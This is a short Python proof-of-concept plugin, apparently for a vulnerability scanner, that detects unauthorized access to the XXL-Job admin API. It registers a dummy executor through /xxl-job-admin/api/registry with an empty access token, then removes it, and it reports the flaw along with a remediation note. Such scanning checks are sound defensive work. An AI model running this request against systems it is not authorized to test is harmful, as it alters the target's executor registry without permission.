#!/usr/bin/env python3
# coding=utf-8

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    try:
        target = '{}://{}:{}{}'.format(service, ip, port, '/xxl-job-admin/api/registry')
        data = {
            "registryGroup": "EXECUTOR",
            "registryKey": "xxl-job-executor-example",
            "registryValue": "http://127.0.0.1:9999/"
        }
        headers = {"XXL-JOB-ACCESS-TOKEN": ""}
        r = await http_client(ip, port).post(target, json=data, headers=headers, timeout=20)
        if 'code' not in r.text:
            return
        if r.status_code == 200 and r.json()['code'] == 200:

            target2 = '{}://{}:{}{}'.format(service, ip, port, "/xxl-job-admin/api/registryRemove")
            r = await http_client(ip, port).post(target2, json=data, headers=headers, timeout=20)
            if r.status_code == 200 and r.json()['code'] == 200:
                ret = {
                    'alert_group': 'XXL-Job API Unauthorized Access',
                    'affects': '%s://%s:%s' % (service, ip, port),
                    'details': u"该漏洞是因为accessToken未配置，任何人都可以对/api/register接口进行请求，"
                               u"注册executor或者删除等,"
                               u"需要配置上accessToken 以防未授权访问"
                }
                return ret
    except json.decoder.JSONDecodeError as e:
        pass
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8080, 'http', True, task_msg={})
    run_plugin_test(scan)
